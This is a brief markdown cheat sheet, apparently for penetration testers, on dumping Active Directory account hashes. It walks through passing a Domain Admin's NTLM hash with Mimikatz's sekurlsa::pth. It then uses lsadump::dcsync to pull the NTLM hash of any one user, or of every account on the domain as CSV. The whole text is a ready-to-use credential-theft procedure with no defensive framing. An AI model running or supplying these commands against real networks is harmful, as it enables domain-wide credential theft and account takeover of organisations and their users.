# Extract Domain Account Hashes with DA NTLM Hash

#### Prerequisites
 - You need the NTLM hash of a Domain Admin (don't need their plain-text password).

#### Launch CMD as Admin
 - Search `cmd` in the start menu, right click and `Run as Admin`

#### Run Mimikatz in context of a DA
Open Mimikatz from the admin cmd prompt.
 - Run the following command:   
```bash
sekurlsa::pth /domain:DOMAIN_NAME /user:DA_USERNAME /ntlm:DA_NTLM_HASH /run:mimikatz.exe
```
 - `DOMAIN_NAME` is the name of the domain e.g. `mydomain.local`.
 - `DA_USERNAME` is the username of the DA e.g. `oldmate`.
 - `DA_NTLM_HASH` is the NTLM hash of the DA account e.g. `58a478135a93ac3bf058a5ea0e8fdb71`.

#### Use the DCSync Command to get Account Hashes
From the newly created Mimikatz window, run the following command:
 	```bash
 	lsadump::dcsync /domain:DOMAIN_NAME /user:DOMAIN_USER
 	```
 - This will return the NTLM hash of the `DOMAIN_USER` account.
 - You can replace `DOMAIN_USER` with any valid domain username and get their NTLM hash.
 - If the machine you're running this on is domain joined then you shouldn't need the `DOMAIN_NAME` parameter.


This will return the NTLM hashes of all user accounts on the domain:
```bash
lsadump::dcsync /all /csv
```
